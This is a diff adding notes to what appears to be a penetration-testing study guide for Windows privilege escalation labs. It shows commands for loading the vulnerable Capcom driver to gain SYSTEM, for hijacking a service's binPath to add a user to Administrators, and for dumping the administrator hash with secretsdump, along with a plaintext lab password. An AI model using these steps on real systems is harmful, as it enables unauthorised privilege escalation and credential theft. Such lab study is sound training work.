@@ -203,3 +203,37 @@ EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```cmd
 reg delete HKCU\System\CurrentControlSet\Capcom
 ```
+### Walkthrough
+```
+cd C:\Tools
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+
+cd ExploitCapcom
+ExploitCapcom.exe
+
+type C:\Users\Administrator\Desktop\flag.txt
+```
+
+# Server Operators
+
+Examining a service
+```cmd
+sc qc AppReadiness
+
+c:\Tools\PsService.exe security AppReadiness
+
+# Checking the groups
+net localgroup Administrators
+
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+sc start AppReadiness
+
+# Confirming Membership
+net localgroup Administrators
+```
+
+```bash
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
